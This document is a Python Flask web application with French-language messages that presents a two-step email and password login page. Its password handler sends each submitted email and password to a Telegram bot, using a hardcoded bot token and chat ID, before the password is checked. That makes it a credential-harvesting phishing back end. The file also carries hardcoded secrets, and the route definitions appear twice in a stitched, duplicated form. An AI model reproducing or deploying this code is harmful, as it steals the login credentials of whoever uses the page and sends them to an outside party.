from flask import Flask, render_template, request, session, redirect, url_for
import requests

app = Flask(__name__)
app.secret_key = "secret123"

BOT_TOKEN = "8928542394:AAEZ9977AxW_GtsaooL5jiSoSTFS-i1o5DU"
CHAT_ID = "6823880612"

USERS = {
    "admin@test.com": "1234"
}

def send_telegram(email, password):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

    message = f"🔐 Nouvelle connexion\n📧 Email: {email}\n🔑 Password: {password}"

    data = {
        "chat_id": CHAT_ID,
        "text": message
    }

    try:
        requests.post(url, data=data, timeout=5)
    except Exception as e:
        print("Telegram error:", e)

@app.route("/login", methods=["POST"])
def login():
    email = request.form.get("email")

    session["pending_email"] = email

    return redirect(url_for("password"))


@app.route("/")
def home():
    return render_template("login.html")


@app.route("/password", methods=["GET", "POST"])
def password():

    email = session.get("pending_email")

    if not email:
        return redirect(url_for("home"))

    error = None

    if request.method == "POST":

        pwd = request.form.get("password")

        # 🔥 TELEGRAM
        send_telegram(email, pwd)

        if USERS.get(email) == pwd:

            session["user"] = email
            session.pop("pending_email", None)

            return redirect(url_for("welcome"))

        else:
            error = "Votre compte ou mot de passe est incorrect"

    return render_template(
        "password.html",
        email=email,
        error=error
    )


@app.route("/welcome")
def welcome():
    user = session.get("user")
    if not user:
        return redirect(url_for("home"))
    return render_template("welcome.html", user=user)


@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("home"))


if __name__ == "__main__":
    app.run(debug=True)


@app.route("/password", methods=["GET", "POST"])
def password():
    email = session.get("pending_email")
    if not email:
        return redirect(url_for("login"))

    error = None
    if request.method == "POST":
        pwd = request.form.get("password", "")
        keep_signed = request.form.get("keep_signed_in") == "on"

        if not pwd:
            error = "Veuillez entrer le mot de passe de votre compte AICHA."
        elif USERS.get(email) == pwd:
            session["user"] = email
            session.permanent = bool(keep_signed)
            session.pop("pending_email", None)
            return redirect(url_for("welcome"))
        else:
            error = ("Votre compte ou votre mot de passe est incorrect. "
                     "Si vous ne vous en souvenez plus, réinitialisez-le maintenant.")
    return render_template("password.html", email=email, error=error)


@app.route("/welcome")
def welcome():
    user = session.get("user")
    if not user:
        return redirect(url_for("login"))
    return render_template("welcome.html", user=user)


@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("login"))


@app.route("/back")
def back_to_email():
    session.pop("pending_email", None)
    return redirect(url_for("home"))


if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=5000)